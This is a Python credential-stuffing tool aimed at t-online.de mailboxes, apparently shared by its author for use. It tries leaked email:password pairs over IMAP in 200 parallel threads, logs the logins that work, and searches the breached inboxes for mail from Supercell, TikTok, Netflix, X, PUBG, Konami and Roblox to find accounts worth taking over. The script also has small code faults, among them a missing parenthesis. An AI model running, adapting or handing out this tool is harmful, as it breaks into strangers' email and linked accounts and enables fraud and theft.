import imaplib
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init


init(autoreset=True)

# Coded by @anasxzer0 // Dont steal!!!

count_valid = 0
count_invalid = 0
count_inbox_found = 0
lock = threading.Lock()


valid_login_file = "emails valid.txt"
inbox_found_file = ""


def check_email(email, password, search_email):
    global count_valid, count_invalid, count_inbox_found

    try:
     
        mail = imaplib.IMAP4_SSL("imap.t-online.de")
        mail.login(email, password)

       
        with lock:
            count_valid += 1
            with open(valid_login_file, "a") as valid_file:
                valid_file.write(f"{email}:{password}\n")

      
        mail.select("inbox")

     
        status, data = mail.search(None, f'FROM "{search_email}"')
        if status == "OK" and data[0]:
            inbox_count = len(data[0].split())
            with lock:
                count_inbox_found += 1
                with open(inbox_found_file, "a") as inbox_file:
                    inbox_file.write(f"{email}:{password} | {inbox_count} | Cfg by = @anasxzer0\n")

        
        mail.logout()

    except imaplib.IMAP4.error:
    
        with lock:
            count_invalid += 1


def process_combo(combo, search_email):
    email, password = combo.strip().split(":")
    check_email(email, password, search_email)


def display_status():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(Fore.GREEN + Style.BRIGHT + f" [+] Login Success [{count_valid}]")
        print(Fore.RED + Style.BRIGHT + f" [-] Bad Login [{count_invalid}]")
        print(Fore.BLUE + Style.BRIGHT + f" [>] Inbox Have/Found [{count_inbox_found}]")
        time.sleep(0.01)


def main():
    global count_valid, count_invalid, count_inbox_found, inbox_found_file

   
    combo_file = input(" [!] Add Combofile: ")
    if not combo_file:
        print("Invalid file path.")
        return

   
    print("\n - Choose an option:")
    print(" - [1] Supercell")
    print(" - [2] TikTok")
    print(" - [3] Netflix")
    print(" - [4] Twitter")
    print(" - [5] Pubg")
    print(" - [6] Konami")
    choice = input(" Choose: ")

 
    if choice == "1":
        search_email = "noreply@id.supercell.com"
        inbox_found_file = "Supercell.txt"
        print(Fore.YELLOW + "!!!! Check!! Searching for Supercell inbox ....")
    elif choice == "2":
        search_email = "register@account.tiktok.com"
        inbox_found_file = "TikTok.txt"
        print(Fore.YELLOW + "!!!! Check!! Searching for TikTok inbox ....")
    elif choice == "3":
         search_email = "info@members.netflix.com"
         inbox_found_file = "Netflix.txt"
         print(Fore.YELLOW + "!!!! Check!! Searching for Netflix inbox ....")
    elif choice == "4":
         search_email = "verify@x.com"
         inbox_found_file = "Twitter.txt"
         print(Fore.YELLOW + "!!!! Check!! Searching for Twitter inbox ....")
    elif choice == "5":
         search_email = "noreply@pubgmobile.com"
         inbox_found_file = "Pubg.txt"
         print(Fore.YELLOW + "!!!! Check!! Searching for Pubg inbox ....")
    elif choice == "6":
         search_email = "konami-info@konami.net"
         inbox_found_file = "Konami.txt"
         print(Fore.YELLOW + "!!!! Check!! Searching for Konami inbox ...."
    elif choice == "7":
         search_email = "accounts@roblox.com"
         inbox_found_file = "Roblox.txt"
         print(Fore.YELLOW + "!!!! Check!! Searching for Roblox inbox ....")
    else:
        print("invali choice.")
        return


    try:
        with open(combo_file, "r") as f:
            combos = f.readlines()
    except FileNotFoundError:
        print("Combo file error.")
        return

  
    display_thread = threading.Thread(target=display_status, daemon=True)
    display_thread.start()

   
    with ThreadPoolExecutor(max_workers=200) as executor:
        for combo in combos:
            executor.submit(process_combo, combo, search_email)
            time.sleep(0.01)

   
    display_thread.join()

if __name__ == "__main__":
    main()